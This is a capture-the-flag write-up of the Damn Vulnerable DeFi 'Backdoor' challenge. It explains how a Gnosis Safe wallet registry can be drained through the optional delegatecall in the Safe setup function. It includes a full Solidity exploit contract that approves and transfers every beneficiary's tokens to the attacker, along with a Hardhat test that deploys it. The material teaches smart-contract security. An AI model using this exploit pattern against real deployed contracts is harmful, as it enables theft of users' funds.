# Damn Vulnerable Token 11: Backdoor

Learn delegate call with the gnosis multisig wallet. It has a fallback and a optional delegate option. If we leave it to others to initialize our contracts, things go wrong! A very intresting task.

## The Task Intro

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens. To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks. Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction. The code is here:

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/backdoor)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/backdoor/backdoor.challenge.js)

## The Solution

### What is Gnosis Safe?

I heard the term multisig wallet, but have not used one until I met Gnosis in this exercise so I watched a few intro videos:

- [Gnosis Safe Homepage](https://safe.global/)
- [What is Gnosis Safe?](https://www.youtube.com/watch?v=y9zNmlzg8AI)
- [Core Unit Tools #01: Gnosis Safe - March 1, 2021](https://www.youtube.com/watch?v=TehZ-3JbBZk)
- [Keeping your crypto SAFU with Gnosis Safe](https://www.youtube.com/watch?v=PKkTto5t8rY)
- [Gnosis Safe Documentation](https://docs.gnosis-safe.io/)

A Gnosis safe is a multisig wallet that can be applied to several usecases like hardwallet/softwallet combinations for individuals looking for security or for teams or DAOs that want to collectivly authorize transactions for ETH, tokens, NFTs, votes, etc.

The basic technical layout is a Safe Logic Contract Gnosis Safe and a Individual Proxy for each Gnosis safe. The proxy is created by a proxy factory:

- Logic Contract / Implementation: GnosisSafe.sol
- Gnosis Safe Proxy / Clone / Proxy: GnosisSafeProxy.sol
- Factory: GnosisSafeProxyFactory.sol
- Callback Interface: IProxyCreationCallback.sol

The Damn Vulnerable Defi gives us a wallet registry and a backdoor test project.

### Wallet Registry

The Wallet Registry is responsible for paying out tokens to the users that register their gnosis wallet with us - at the point of the wallet creation . This happens with a callback that gets called after the proxy creation happens (callback from GnosisSafeProxyFactory). Besides this we find a addBenificiary function and a constructor.

At the end of the proxyCreated function 10 tokens are transfered to the owner of the GnosisSafeProxy. Before quite some background checks happen:

- The contract needs to have a min Balance of tokens, here 10
- the call must come from the same GnosisSafeProxyFactory that was given the registry in the constructor of the walletregistry
- The maskercopy needs to be the same as passed in the constructor of the walletregistry
- The setup function must have been called **-> Check the Gnosis Safe Setup**
- The threshold needs to be 1
- The amount of owners need to be 1
- There must be NO fallback Manager defined
- Then the beneficiary will be removed out of the beneficiary array to avoid double claiming
- Then the claimed wallet address(GnosisSafeProxy) will be added to the array of registered wallets
- The 10 tokens are transfered

The most important thing here is the Gnosis Safe Setup and in there the Fallback Manager:

````apache
  /// @dev Setup function sets initial storage of contract.
    /// @param _owners List of Safe owners.
    /// @param _threshold Number of required confirmations for a Safe transaction.
    /// @param to Contract address for optional delegate call.
    /// @param data Data payload for optional delegate call.
    /// @param fallbackHandler Handler for fallback calls to this contract
    /// @param paymentToken Token that should be used for the payment (0 is ETH)
    /// @param payment Value that should be paid
    /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
...
```
````

The FallbackHandler would be a vulnerability, but it is blocked by a check inside the Walletregistry. Therefore I will use the optional Delegate to combined with calldata.

### Test Backdoor js

To understand what is going on in the Damn Vulnerable Defi Challenges the Testfile is important. What happens here?

- There are 4 users defined: Alice, Bob, Charlie and David, then a deployer and a player that will be the attacker.
- 3 contracts are deployed: The mastercopy which is the implementation of the Gnosis Safe, the walletFactory which is the Proxy Factory and the ERC20 Token
- As the 4th contract the script deploys the WalletRegistry and passes the 3 contracts and the beneficiary users as parameters
- IMPORTANT: No Proxies are deployed
- Then the script checks if all elements of the benificiaries array are set to true and that they cannot add other beneficiaries
- Finally 40 tokens are transfered to the wallet registry contract.

The test will pass and I would have solved the contract if:

- The attack happens in one transaction
- For every user the wallet should be registered in the wallet array
- For every user the benificiary array should be set to false
- All 40 tokens should be with the player

### Vulnerability and Attack

At first this task looked easy - use a fallback manager and execute the code based on this. But hey, this did not work out because the Wallet Registry checks for this. As written above I moved to the optional delegate. `GnosisSafeProxyFactory.createProxyWithCallback`(not static) creates a proxy and executes the setup method. If an optional delegate is set, the `ModuleManager.setupModules()`(not static) is called that triggers a call to the `Executor.execute` which triggers a delegatecall to the contract address and method we provided.

Here we can inject our code and approve a token transfer first then transfer it to the players wallet :-) So my attack will:

- Handle everything in a attackers contract constructor, that I achieve the requirement of an attack in 1 transaction
- Create a secondary contract for the approval of the transfer of the tokens, because in the constructor the bytecode of the contract is not yet deployed.
- Create a ProxyGnosisSafe for all of the 4 users with factory.createProxyWithCallback - loop over the usersit.
- Define an optional delegate call with data
- ❤️❤️❤️ At the end call transferFrom to transfer the token from the user to the attacker ❤️❤️❤️

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttack {
    address proxy;
    uint256 constant PAYMENT_AMOUNT = 10 ether;

    constructor(GnosisSafeProxyFactory factory, address mastercopy, address[] memory users, address token, address callback) {
        console.log("The BackdoorAttack contract address is: ", address(this));
        address approveAttack = address(new ApproveAttack());
        console.log("The TransferAttack contract address is: ", approveAttack);
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory oneOwner = new address[](1);
            oneOwner[0] = users[i];

            proxy = address(
                factory.createProxyWithCallback(
                    mastercopy,
                    abi.encodeWithSelector(
                        GnosisSafe.setup.selector, //"setup(address[],uint256,address,bytes,address,address,uint256,address)",
                        oneOwner, // current owner
                        1, // threshold
                        address(approveAttack), //attack, // optional delegate call
                        abi.encodeWithSignature("approve(address,address,uint256)", address(token), address(this), 10 ether), //bytes encode function attack
                        address(0), // no fallback handler, because the callback does not allow it
                        address(0), // payment token is ether
                        uint256(0), // Value that should be paid
                        address(0) // address that should receive the payment 0 for tx.origin
                    ),
                    0, // SALT
                    IProxyCreationCallback(callback) // Wallet Registry
                )
            );
            DamnValuableToken(token).transferFrom(proxy, msg.sender, 10 ether);
        }
    }
}

contract ApproveAttack {
    function approve(address token, address backDoorContract, uint256 amount) public {
        DamnValuableToken(token).approve(backDoorContract, amount);
    }
}
```

```àpache
  it('Execution', async function () {
    const attackerFactory = walletFactory.connect(player);
    const attackerMasterCopy = masterCopy.connect(player);
    const attackerToken = token.connect(player);
    const attackerWalletRegistry = walletRegistry.connect(player);

    let attack = await ethers.getContractFactory('BackdoorAttack', player);
    let contract = await attack
      .connect(player)
      .deploy(attackerFactory.address, attackerMasterCopy.address, users, attackerToken.address, attackerWalletRegistry.address, {
        gasLimit: 30000000,
      });
  });
```

After quite some reading I spotted the vulnerability myself. But suffered with the gasLimit!!!! What a pain. I could not interpret the message cannot estimate gas correctly - instead of defining the gasLimit in the test or installing the gas-reporter I searched everything in the net for this issue and read the full project back and forth :-)

## Conclusion

Done 🎉️ ! This Damn Vulnerable Defi Challenge was easier to solve than challenge 12 Climber. Here it was just to follow the path of the code, seeing the setup function of the Gnosis Safe made the Vulnerability clear. The following steps of placing the attack to the constructor of the smart contract, iterating over all 4 users, create a proxy with the proxyfactory, make use of the optional delegate, realize that I need to create a seperate contract for the optional delegate call, because the attackers contract code is not yet deployed, approve a transfer in the separte contract because it is executed in the context of the proxyfactory, encode the necessary function and parameter and finally transfer the tokens from each user.

Reading the contract from Gnosis Safe and dealing with not enough gas was my major issue with this challenge. The first was very useful learning experience! The second that painful so that I will never forget setting the gasLimit or the gas-reporter. BTW deoploying these contracts is very expensive, so it is obvious the technical persons in charge moved from redeploying the full implementation to clones/proxies for each wallet. GREAT Week 13/14 DONE 🎉️!

······················|············|··············|·············|·············|···············|··············
| Contract · Method · Min · Max · Avg · # calls · eur (avg) │
······················|············|··············|·············|·············|···············|··············
| DamnValuableToken · transfer · - · - · 52019 · 1 · - │
······················|············|··············|·············|·············|···············|··············
| Deployments · · % of limit · │
···································|··············|·············|·············|···············|··············
| BackdoorAttack · - · - · 1901125 · 6.3 % · - │
···································|··············|·············|·············|···············|··············
| DamnValuableToken · - · - · 1314704 · 4.4 % · - │
···································|··············|·············|·············|···············|··············
| GnosisSafe · - · - · 5464661 · 18.2 % · - │
···································|··············|·············|·············|···············|··············
| GnosisSafeProxyFactory · - · - · 1103530 · 3.7 % · - │
···································|··············|·············|·············|···············|··············
| WalletRegistry · - · - · 1387103 · 4.6 % · - │
·----------------------------------|--------------|-------------|-------------|---------------|-------------·
